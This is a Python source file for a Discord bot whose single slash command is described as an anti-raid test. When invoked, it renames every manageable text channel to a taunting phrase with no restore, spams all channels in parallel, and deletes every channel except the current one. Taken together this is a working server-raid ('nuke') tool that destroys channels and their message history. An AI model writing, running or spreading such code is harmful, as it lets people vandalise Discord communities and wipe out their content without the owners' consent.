import os
import asyncio
import discord
from discord import app_commands

TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN が設定されていません")


class TestBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.messages = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()

    async def on_ready(self):
        print(f"ログイン成功: {self.user}")


bot = TestBot()


async def rename_channel(channel: discord.TextChannel, new_name: str, reason: str):
    try:
        await channel.edit(name=new_name, reason=reason)
        return True
    except Exception as e:
        print(f"[CHANNEL] {channel.id} 名前変更失敗: {e}")
        return False


async def spam_channel(channel: discord.TextChannel, count: int):
    for i in range(count):
        try:
            await channel.send(f"【SPAM TEST】{i + 1}/{count}")
            await asyncio.sleep(0.12)
        except Exception as e:
            print(f"[SPAM] {channel.id}: {e}")
            break


async def delete_channel(channel: discord.TextChannel):
    try:
        await channel.delete(reason="アンチレイドBotのテスト（チャンネル削除）")
        print(f"[DELETE] {channel.id} 削除完了")
        return True
    except Exception as e:
        print(f"[DELETE] {channel.id} 削除失敗: {e}")
        return False


@bot.tree.command(
    name="test",
    description="全チャンネル名変更 + 同時スパム + チャンネル削除テスト"
)
@app_commands.describe(
    count="各チャンネルへの送信回数（1〜50）"
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
async def test(
    interaction: discord.Interaction,
    count: app_commands.Range[int, 1, 50] = 5
):
    if interaction.guild is None:
        await interaction.response.send_message(
            "❌ このコマンドはサーバー内でのみ使用できます。",
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        f"🧪 高速テスト開始！\n"
        f"1. 全テキストチャンネル名を変更（復元なし）\n"
        f"2. 全チャンネルに {count} 回同時スパム\n"
        f"3. 現在のチャンネル以外を削除",
        ephemeral=True
    )

    guild = interaction.guild

    if guild.me is None:
        try:
            await interaction.followup.send(
                "❌ Botがこのサーバーに参加していません。",
                ephemeral=True
            )
        except discord.HTTPException:
            pass
        return

    # 操作可能なテキストチャンネルを収集
    text_channels = []
    for ch in guild.text_channels:
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages and perms.manage_channels:
                text_channels.append(ch)
        except Exception:
            pass

    if not text_channels:
        me_perms = guild.me.guild_permissions
        msg = (
            "❌ 操作可能なテキストチャンネルがありません。\n\n"
            f"・メッセージ送信: {'✅' if me_perms.send_messages else '❌'}\n"
            f"・チャンネルの管理: {'✅' if me_perms.manage_channels else '❌'}\n"
            f"・管理者: {'✅' if me_perms.administrator else '❌'}"
        )
        try:
            await interaction.followup.send(msg, ephemeral=True)
        except discord.HTTPException:
            pass
        return

    current_channel_id = interaction.channel.id if interaction.channel else None
    test_name = "じいちゃん様に完全降伏wwwwwwww"

    # =========================
    # 1. 全チャンネル名を並列で変更（復元なし）
    # =========================
    print(f"[TEST] 名前変更開始（並列・復元なし）: {len(text_channels)} チャンネル")
    await asyncio.gather(*[
        rename_channel(ch, test_name, "じいちゃん様に完全敗北wwwww")
        for ch in text_channels
    ])

    await asyncio.sleep(3)

    # =========================
    # 2. 全チャンネルに同時スパム
    # =========================
    print(f"[TEST] 同時スパム開始: {len(text_channels)} ch × {count}")
    spam_tasks = []
    for ch in text_channels:
        ch = guild.get_channel(ch.id)
        if ch and isinstance(ch, discord.TextChannel):
            spam_tasks.append(spam_channel(ch, count))
    await asyncio.gather(*spam_tasks)

    # =========================
    # 3. 現在のチャンネル以外を削除
    # =========================
    print("[TEST] チャンネル削除開始")
    delete_tasks = []
    for ch in text_channels:
        ch = guild.get_channel(ch.id)
        if ch is None or not isinstance(ch, discord.TextChannel):
            continue
        if ch.id == current_channel_id:
            continue
        delete_tasks.append(delete_channel(ch))

    if delete_tasks:
        await asyncio.gather(*delete_tasks)

    print(f"[TEST 完了] guild={guild.id} channels={len(text_channels)} count={count}")

    try:
        await interaction.followup.send(
            f"✅ テスト完了\n"
            f"対象チャンネル: {len(text_channels)}\n"
            f"スパム回数: {count}\n"
            f"削除したチャンネル: {len(delete_tasks)}",
            ephemeral=True
        )
    except discord.HTTPException:
        pass


bot.run(TOKEN)
